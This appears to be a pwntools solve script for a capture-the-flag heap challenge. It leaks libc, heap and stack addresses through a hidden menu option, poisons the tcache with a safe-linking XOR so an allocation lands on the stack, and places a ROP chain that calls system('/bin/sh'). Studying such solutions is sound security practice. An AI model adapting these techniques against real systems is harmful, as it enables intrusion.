from pwn import *

context.binary = elf = ELF("./chall")
libc = ELF("./lib/libc.so.6")
p = process("./chall")

def allocate(buf):
    p.sendlineafter(b"opt: ", b"1")
    p.sendlineafter(b"name: ", buf)

def scoop(idx):
    p.sendlineafter(b"opt: ", b"2")
    p.sendlineafter(b"poop idx: ", str(idx).encode())

def inspect():
    p.sendlineafter(b"opt: ", b"3")
    p.recvuntil(b"hand, ")
    return p.recvuntil(b", and marvel", drop=True)

def scoop(idx):
    p.sendlineafter(b"opt: ", b"2")
    p.sendlineafter(b"idx: ", str(idx).encode())

def secret(idx):
    global libc
    p.sendlineafter(b"opt: ", b"1337")
    p.sendlineafter(b"idx: ", str(idx).encode())
    p.recvuntil(b"called it ");
    leak = p.recvuntil(b".", drop=True)
    libc.address = u64(leak[32:40]) - libc.sym._IO_2_1_stdout_ - 131
    p.sendafter(b"name: ", p64(u64(leak[:8]) | 0x1800) + leak[8:32] + p64(libc.sym.environ) + p64(libc.sym.environ+160))
    x = 0
    # while True:
    #     print(x, hex(u64(p.recv(8))))
    #     x += 1
    #     if x == 500:
    #         sleep(10)

    leak = p.recv(8*4)
    heap_leak = u64(leak[-8:])
    stack_leak = u64(leak[:8])
    # print(hex(stack_leak))
    # print(hex(heap_leak))
    return heap_leak, stack_leak

def eat():
    p.sendlineafter(b"opt: ", b"4")

def roll_toilet_paper(amt):
    p.sendlineafter(b"opt: ", b"5")
    p.sendlineafter(b"amt: ", str(amt).encode())


gdb.attach(p)
heap_leak, stack_leak = secret(-4)
heap_leak -= 129312
stack_leak -= 320 + 8

log.info(f"heap leak @ {hex(heap_leak)}")
log.info(f"stack leak @ {hex(stack_leak)}")
log.info(f"libc base @ {hex(libc.address)}")
roll_toilet_paper(heap_leak)


allocate(p64(0)*3 + p64(0x41))
allocate("shit 2")

p.sendlineafter(b"idx: ", "0")
eat()

scoop(1)
eat()

scoop(-2)
eat()

allocate(b"A"*16 + p64(0) + p64(0x41) + p64(stack_leak ^ ((heap_leak+32)>>12)))
allocate(b"ezpz")


allocate(p64(0) + p64(libc.address + 0x243d3) + p64(libc.address + 0x243d2) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system))
# scoop(-2)
# eat()

# stack_leak = u64(p.recv(8))
# print(hex(stack_leak))

p.interactive()
